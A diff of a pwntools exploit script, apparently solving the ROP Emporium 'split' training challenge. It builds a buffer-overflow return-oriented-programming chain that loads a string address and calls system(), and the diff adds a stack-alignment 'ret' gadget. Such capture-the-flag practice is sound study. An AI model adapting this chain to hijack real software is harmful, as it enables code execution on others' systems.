@@ -6,23 +6,23 @@ executable = 'split'
 gdbinit = 'b *0x400740'
 
 elf = ELF(executable)
-libc = elf.libc 
+# libc = elf.libc
 
-rop = ROP([elf, libc])
+# rop = ROP([elf, libc])
 
 p = process(elf.path)
 
 # gdb.attach(p, gdbscript=gdbinit)
 
-p.recvuntil("")
+p.recvuntil(b"")
 
 payload = b''
 payload += b'a'*0x28
 payload += p64(0x00000000004007c3) # pop rdi
 payload += p64(0x601060) # useful strings
+payload += p64(0x40053e) # ret
 payload += p64(0x400560) # call system
 
-pause()
 p.send(payload)
 
 p.interactive()
